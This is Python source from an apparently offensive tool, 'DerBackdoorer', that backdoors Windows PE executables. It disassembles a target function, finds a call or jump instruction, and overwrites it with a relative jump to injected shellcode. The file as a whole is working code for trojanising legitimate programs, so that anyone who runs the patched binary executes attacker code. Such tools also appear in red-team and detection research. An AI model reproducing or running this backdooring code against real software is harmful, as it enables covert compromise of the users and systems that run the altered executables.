#!/usr/bin/python3
#
# Based on the original RedBackdoorer by Mariusz Banach
#

import random
import pefile
import capstone
import keystone
import logging
from intervaltree import *

from utils import hexdump
from pe.superpe import SuperPe
from model.defs import *
from pe.asmdisasm import assemble_relative_jmp, asm_disasm, cs, ks, printInstr

logger = logging.getLogger("DerBackdoorer")


class DEPTH_OPTIONS(Enum):
    LEVEL1 = 1
    LEVEL2a = 2
    LEVEL2b = 3
    

class FunctionBackdoorer:
    def __init__(self, superpe: SuperPe, depth_option=DEPTH_OPTIONS.LEVEL1):
        self.superpe: SuperPe = superpe
        self.pe_data = self.superpe.pe.get_memory_mapped_image()
        self.depth_option: DEPTH_OPTIONS = depth_option


    def backdoor_function(self, function_addr: int, shellcode_addr: int, shellcode_len: int):
        logger.info("--[ Backdooring exe function at 0x{:X} with jump to carrier at 0x{:X}".format(function_addr, shellcode_addr))
        
        addr = self.find_suitable_instruction_addr(function_addr)
        if addr is None:
            raise Exception("Couldn't find a suitable instruction to backdoor")

        compiled_trampoline = assemble_relative_jmp(addr, shellcode_addr)
        logger.info("--[ Backdoor Instruction at 0x{:X} (offset to shellcode: 0x{:X})".format(addr, shellcode_addr - addr))
        
        # Check for overlap
        it = IntervalTree()
        it.addi(addr, addr+len(compiled_trampoline))
        if it.overlap(shellcode_addr, shellcode_addr+shellcode_len):
            logger.warning("Attempt to patch jump (0x{:X}-0x{:X}) to shellcode (0x{:X}-0x{:X}) but they overlap and probably dont work".format(
                addr, addr+len(compiled_trampoline), shellcode_addr, shellcode_addr+shellcode_len
            ))
            logger.warning("Text section too small?")

        # write
        #logger.info("Trampoline: {}".format(compiled_trampoline))
        #asm_disasm(compiled_trampoline, offset=function_addr)
        self.superpe.pe.set_bytes_at_rva(addr, bytes(compiled_trampoline))

        # Show Result
        logger.info("--[ Patched result of function: ".format())
        #data = self.pe_data[function_addr:addr+len(compiled_trampoline)]
        data = self.superpe.pe.get_data(function_addr, addr+len(compiled_trampoline)-function_addr)
        asm_disasm(data, offset=function_addr)


    def find_suitable_instruction_addr(self, startOffset, length=256):
        """Find a instruction to backdoor. Recursively."""
        logger.info("---[ find suitable instruction to hijack starting from 0x{:X} len:{} depthopt:{}".format(
            startOffset, length, self.depth_option))

        if self.depth_option == DEPTH_OPTIONS.LEVEL1:
            return self._find_suitable_instruction_addr(startOffset, length, 1)
        else:
            addr = self._find_suitable_instruction_addr(startOffset, length, 2)
            logger.info("Using code at 0x{:X} to find instruction".format(addr))
        
            if self.depth_option == DEPTH_OPTIONS.LEVEL2a:
                return self._find_suitable_instruction_addr(addr, length, 2)
            elif self.depth_option == DEPTH_OPTIONS.LEVEL2b:
                return self._find_suitable_instruction_addr(addr, length, 3)

        return None


    def _find_suitable_instruction_addr(self, startOffset, length, option):
        # iterate through every instruction. starting from startOffset
        data = self.pe_data[startOffset:startOffset + length]
        for instr in cs.disasm(data, startOffset):
            printInstr(instr, 0)
            
            if instr.mnemonic.lower() in ['ret']:
                return None
            if len(instr.operands) != 1:
                continue
            operand = instr.operands[0]
            if operand.type != capstone.CS_OP_IMM:
                # find a call/jmp instruction with an immediate operand
                continue

            jump_instructions = ['call', 'jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
            if not instr.mnemonic.lower() in jump_instructions:
                continue
            if option == 1:  # addr
                return instr.address
            elif option == 2:  # dest taken
                return operand.value.imm
            elif option == 3:  # dest not taken
                return instr.address + instr.size

        return None

